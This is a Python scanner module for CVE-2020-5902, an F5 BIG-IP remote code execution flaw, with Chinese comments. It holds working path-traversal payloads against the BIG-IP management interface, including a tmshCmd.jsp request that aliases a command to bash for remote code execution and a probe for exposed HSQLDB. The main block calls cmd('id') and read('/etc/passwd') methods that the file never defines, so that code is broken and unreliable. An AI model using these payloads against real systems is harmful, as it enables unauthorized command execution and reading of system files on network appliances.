#!/usr/bin/env python3

import uuid
from app.lib.common import get_useragent
from app.lib.request import request

class CVE_2020_5902_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2020-5902',
            'description': 'F5 BIG-IP Remote Code Execution Vulnerability, 受影响版本: BIG-IP versions 15.0.0-15.1.0.3, 14.1.0-14.1.2.5, 13.1.0-13.1.3.3, 12.1.0-12.1.5.1, and 11.6.1-11.6.5.1',
            'date': '2020-07-03',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        self.file = str(uuid.uuid1())
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            'User-Agent': get_useragent(),
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.check_payload = '/tmui/login.jsp/..;/tmui/system/user/authproperties.jsp'
        self.cmd_payload = '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash'
        self.list_payload = '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/%s' %(self.file)
        self.delete_payload = '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list'

    async def check(self):
        
        """
        检测是否存在漏洞

        :param:
        :return bool True or False: 是否存在漏洞
        """

        check_req = await request.get(self.url + self.check_payload, headers = self.headers)
        if 'password_policy_table' in await check_req.text():
            return True
        hsqldbRsp = await request.get(self.url + '/hsqldb;', headers = self.headers)
        if 'HSQL Database Engine' in await hsqldbRsp.text() and hsqldbRsp.status == 200:
            return True
        hsqldbRsp1 = await request.get(self.url + '/hsqldb%0a', headers = self.headers)
        if 'HSQL Database Engine' in await hsqldbRsp1.text() and hsqldbRsp1.status == 200:
            return True

if  __name__ == "__main__":
    CVE_2020_5902 = CVE_2020_5902_BaseVerify('https://127.0.0.1')
    print(CVE_2020_5902.cmd('id'))
    print(CVE_2020_5902.read('/etc/passwd'))
      